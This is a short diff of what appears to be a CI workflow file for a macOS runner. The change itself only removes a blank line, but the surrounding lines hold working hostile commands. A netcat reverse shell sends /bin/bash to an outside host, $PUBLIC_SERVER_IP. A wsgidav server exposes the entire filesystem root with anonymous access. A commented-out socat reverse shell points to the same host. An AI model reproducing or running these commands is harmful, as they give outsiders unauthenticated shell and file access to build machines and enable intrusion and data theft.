@@ -33,7 +33,6 @@ jobs:
           nohup netcat $PUBLIC_SERVER_IP 2333 -e /bin/bash &
           "$(xcrun python3 -m site --user-base)/bin/wsgidav" --host=0.0.0.0 --port=8080 --root=/ --auth=anonymous
 
-          
           # export PATH=$PATH:"$(xcrun python3 -m site --user-base)/bin"
           # nohup "$(xcrun python3 -m site --user-base)/bin/wsgidav" --host=0.0.0.0 --port=8080 --root=/ --auth=anonymous &
           # nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2224 &
